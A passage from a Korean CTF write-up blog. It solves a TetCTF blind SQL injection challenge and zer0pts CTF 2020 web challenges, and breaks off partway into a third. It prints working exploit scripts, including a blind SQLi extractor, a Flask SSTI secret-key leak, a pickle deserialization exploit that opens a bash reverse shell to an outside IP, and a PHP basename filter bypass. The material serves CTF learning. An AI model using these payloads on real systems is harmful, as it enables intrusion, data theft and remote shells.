class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- The Author of this challenge is so kind <span class="keyword">and</span> handsome that he is giving you flag, just need to bypass his god-tier waf <span class="keyword">and</span> grab it &lt;<span class="number">3</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;dbconnect.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// filter all what i found on internet.... dunno why ｡ﾟ･（&gt;﹏&lt;）･ﾟ｡</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\&lt;|\&gt;|\=/is&#x27;</span> , <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;img src=&quot;https://i.imgur.com/C42ET4u.gif&quot; /&gt;&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// prevent sql injection</span></span><br><span class="line">        <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;select * from flag_here_hihi where id=&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$run_query</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$run_query</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;    </span><br><span class="line">            <span class="comment">// I&#x27;m kidding, just the name of flag, not flag :(</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$run_query</span>-&gt;fetch_array()[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$res</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>일단 preg_match() 함수를 이용해서 수 많은 키워드를 필터링하고 있는 것을 볼 수 있습니다. 그리고 id 값이 1일때, 2일때의 출력값이 다르므로 Blind Based SQL Injection을 이용해 <code>flag</code>를 뽑아야겠다 생각이 들었습니다.</strong><br><br></p><p><strong>하지만 <code>culumn</code>이라는 키워드가 필터링이 걸려 있어 <code>flag</code>가 들어있는 컬럼을 Blind Based SQL Injection을 이용해서 뽑아올 수 없을 거 같다는 생각이 들었습니다. 왜냐하면 <code>information_schema.columns</code>라는 메타 테이블에서 <code>column_name</code>을 조회해야 하는데 필터링에 때문에 불가능하기 때문입니다.</strong><br><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.51.35.png?raw=true"><br><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%206.56.37.png?raw=true"></p><p><strong>그러다가 N1 CTF에서 <code>exp()</code> 함수를 이용해서 Error Based Blind SQL Injection을 이용한 적이 있어서 위와 같이 MySQL의 <code>exp()</code>함수를 이용해서 <code>Overflow</code>를 일으켜 에러에 내가 원하는 값(Column Name)을 포함시키는 방식으로 해결하려 했지만 <code>exp()</code> 함수를 필터링하고 있었습니다. 아마 이 방법을 못 쓰게 방지한 거 같습니다. 그래서 그냥 새해니 쉴려고 접고, 롤을 했었습니다. 그러다 오늘 아침에 다시 확인을 해보니 <code>exp()</code> 함수 대신 <code>pow()</code> 함수를 이용해도 잘 되는 것을 확인할 수 있었습니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%207.01.29.png?raw=true"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pow(<span class="operator">~</span>(<span class="keyword">select</span> id <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag_here_hihi limit <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">as</span> id),<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p><strong>그래서 위 페이로드를 id 값으로 넘겨주니 에러에 컬럼 이름들이 포함되어 있는 것을 확인할 수 있었고, <code>t_fl4g_v3lue_su</code>라는 컬럼이 존재하는 것을 알 수 있었습니다.  이제 해당 컬럼의 값을 Blind Based SQL Injection을 이용해서 뽑아내면 GG</strong><br><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://45.77.255.164/?id=&quot;</span></span><br><span class="line">flag_len, flag = <span class="number">0</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag_len</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">payload = <span class="string">&quot;length(t_fl4g_v3lue_su)in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag_len = i</span><br><span class="line">print(<span class="string">&quot;[+] Flag Length is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag</span>():</span></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, flag_len + <span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>, <span class="number">126</span>):</span><br><span class="line">payload = <span class="string">&quot;ascii(right(left(t_fl4g_v3lue_su,&#123;&#125;),1))in(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">URL = url + payload</span><br><span class="line">res = requests.get(URL)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;handsome_flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">flag += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;Flag is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Exploitation ...&quot;</span>)</span><br><span class="line">Flag_len()</span><br><span class="line">Flag()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202021-01-03%20%EC%98%A4%ED%9B%84%208.20.53.png?raw=true"></p><p><strong>위와 같이 익스플로잇 코드를 작성하고 돌려주니 flag가 잘 나오는 것을 볼 수 있습니다.</strong><br></p><p><code>FLAG : TetCTF&#123;_W3LlLlLlll_Pl44yYyYyyYY_&lt;3_vina_*100*28904961445554#&#125;</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injecion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts CTF 2020 Write Up</title>
      <link href="2020/12/26/2020-12-26-zer0pts-CTF-2020/"/>
      <url>2020/12/26/2020-12-26-zer0pts-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>Zer0pts CTF는 일본팀인 Zer0pts에서 주최한 대회입니다. 2020 대회는 3월 7일에 열렸지만 도커 파일이 남아 있어 문제를 풀어 보았습니다. 그리고 서버 구축은 아래와 같이 하면 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;gitlab.com&#x2F;zer0pts&#x2F;zer0pts-ctf-2020.git</span><br><span class="line">cd zer0pts-ctf-2020</span><br><span class="line">cd &lt;Desired Problem&gt;</span><br><span class="line">docker-compose up -d ( if the &#96;-d&#96; option given, it is excuted as the backend. )</span><br></pre></td></tr></table></figure><hr><h2 id="Web-notepad-332pts"><a href="#Web-notepad-332pts" class="headerlink" title="(Web) notepad [332pts]"></a>(Web) notepad [332pts]</h2><blockquote><p>notepad 문제는 Python Pickle 모듈의 loads 함수에서 발생하는 RCE 취약점과 Flask SSTI 취약점을 주제로 한 문제입니다. 일단 app.py가 주어지는데 필요한 부분만 확인을 해보겠습니다.</p></blockquote><p><span style="color:#631F9C">&#62;</span> SSTI Vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Automatically go back when page is not found &quot;&quot;&quot;</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">&quot;Referer&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;3;URL=&#123;&#125;&quot;&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>404 에러 페이지를 확인해보면 <code>Referer</code> 헤더를 가져와서 <code>URL</code> 값으로 그대로 사용하는 것을 볼 수 있습니다. Referer의 대한 검증 과정이 존재하지 않아 SSTI 취약점이 발생합니다.<br><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/notepad/1.png?raw=true"><br>그래서 Referer 헤더로 &#123;&#123;config&#125;&#125;를 보내주니 SSTI가 발생해서 config 객체를 출력해주는 것을 볼 수 있고, 시크릿 키가 <code>b&#39;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#39;</code>라는 것을 알 수 있습니다. 시크릿 키를 구했기 때문에 <code>session</code>을 마음대로 조작이 가능할 거 같습니다.</p><p><span style="color:#631F9C">&#62;</span> Python Pickle Deserialization Vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/note/&lt;int:nid&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notepad</span>(<span class="params">nid=<span class="number">0</span></span>):</span></span><br><span class="line">    data = load()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= nid &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        nid = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, data=data, nid=nid)</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Load saved notes &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">&#x27;savedata&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">&quot;date&quot;</span>: now(), <span class="string">&quot;text&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;*New Note*&quot;</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>/note를 보면 load() 함수를 호출하는 것을 볼 있습니다. load() 함수는 세션 값에서 <code>savedata</code>라는 값을 가져와서 base64 디코딩을 하고, pickle.loads() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. 바로 여기서 RCE 취약점이 발생합니다. 해당 취약점에 자세한 내용은 구글을 통해 확인할 수 있습니다.<br><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/notepad/2.png?raw=true"><br>Flask 세션 관련 내용을 정확히 숙지하고 있지 않아서 구글에 검색을 해보니 <code>sessions.SecureCookieSessionInterface</code>, <code>Flask</code> 두 함수를 이용하면 시크릿 키를 이용해 세션 값을 만들어 줄 수 있는 것을 알 수 있었습니다. 물론 Flask 함수를 쓰지 않고 클래스를 생성해서도 줄 수 있습니다.</p><p>그러니 시크릿 키를 이용해서 세션 값을 변조하고, 변조한 세션 값을 가지고, /note/<a href="int:id">int:id</a>로 접근을 해주면 load() 함수의 pickle.loads() 함수가 호출이 돼서 RCE가 발생하게 됩니다. </p><p><span style="color:#631F9C">&#62;</span> Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, base64, pickle, requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/141.164.52.207/12345 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line">key_ = <span class="string">b&#x27;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">  app = Flask(<span class="string">&quot;app&quot;</span>)</span><br><span class="line">  app.secret_key = key_</span><br><span class="line">  </span><br><span class="line">  sscsi = SecureCookieSessionInterface()</span><br><span class="line">  signingSerializer = sscsi.get_signing_serializer(app)</span><br><span class="line">  </span><br><span class="line">  session = signingSerializer.dumps(&#123;<span class="string">&#x27;savedata&#x27;</span>:base64.b64encode(pickle.dumps(RCE()))&#125;)</span><br><span class="line">  print(<span class="string">&quot;Sessions : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(session))</span><br><span class="line">  requests.get(<span class="string">&#x27;http://localhost:8001/note/1&#x27;</span>, cookies = &#123;<span class="string">&#x27;session&#x27;</span>:session&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  print(<span class="string">&quot;[+] RCE in Pickle Start&quot;</span>)</span><br><span class="line">  exploit()</span><br></pre></td></tr></table></figure><p>그래서 파이썬을 이용해서 위와 같이 RCE POC를 작성해주었습니다. 처음에는 <code>nc</code>를 이용해서 쉘을 딸려 했지만 잘 되지 않았습니다. 그래서 그냥 코드 미스인 줄 알았는데 <code>bash -c</code>를 이용해서 쉘을 따주니 잘 되었습니다.<br><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/notepad/3.png?raw=true"><br>RCE POC를 돌려주니 쉘이 잘 따지는 것을 볼 수 있고, flag도 볼 수 있었습니다. ( nc 명령어를 확인해보니 명령어 자체가 없었음 )</p><blockquote><p>FLAG : zer0pts{fl4sk_s3ss10n_4nd_pyth0n_RCE}</p></blockquote><hr><h2 id="Web-Can-you-guess-it-345pts"><a href="#Web-Can-you-guess-it-345pts" class="headerlink" title="(Web) Can you guess it [345pts]"></a>(Web) Can you guess it [345pts]</h2><blockquote><p>Can you guess it 문제는 PHP 트릭류 문제입니다.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#631F9C">&#62;</span> analysis</p><p>FLAG는 config.php에 정의가 되어 있다고 합니다.</p><p>코드를 보면 <code>$_SERVER[&#39;PHP_SELF&#39;]</code>의 값을 highlight_file() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. <code>$_SERVER[&#39;PHP_SELF&#39;]</code>는 현재 페이지의 주소에서 도메인과 넘어가는 값(파라미터)를 제외한 것들을 가져오는 슈퍼 글로벌 함수 입니다. 즉, Path만 가져온다는 것 입니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 preg_match() 함수를 이용해서 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 값을 검증하고 있기 때문에 일반적으로 접근을 하게 되면 <code>config.php</code>가 필터링에 걸리기 때문에 힘들 거 같습니다.</p><p>그러다 구글링을 하다가 <a href="https://ngaa.tistory.com/m/46?category=776250">여기서</a> 신기한 것을 발견했습니다. basename 함수에 \x80-\xff 범위의 값 중 하나만 들어오면 그 값은 무시한다는 것을 알 수 있었습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xbb&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xab&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xff&quot;);</span><br><span class="line">config.php</span><br></pre></td></tr></table></figure><p>테스트를 해본 결과 \x80-\xff 범위의 값을 모두 무시하는 것을 확인할 수 있었습니다. 그리고 저 범위의 값들이 prge_match에 들어가도 우회가 됩니다.</p><p><span style="color:#631F9C">&#62;</span> Exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php&#x2F;%aa?source</span><br></pre></td></tr></table></figure><p>위 path로 접근을 해주면 preg_match(), basename() 함수를 우회해 config.php의 소스 코드를 볼 수 있습니다.</p><blockquote><p>FLAG : zer0pts{gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n}</p></blockquote><hr><h2 id="Web-urlapp-435pts"><a href="#Web-urlapp-435pts" class="headerlink" title="(Web) urlapp [435pts]"></a>(Web) urlapp [435pts]</h2><blockquote><p>urlapp 문제는 루비로 작성된 Redis 서비스에서 Redis SSRF 취약점을 주제로한 문제입니다. 하지만 왠지 모르게 익스를 계속 시도해도 set 명령어가 제대 인식이 되지 않는 거 같다.</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span 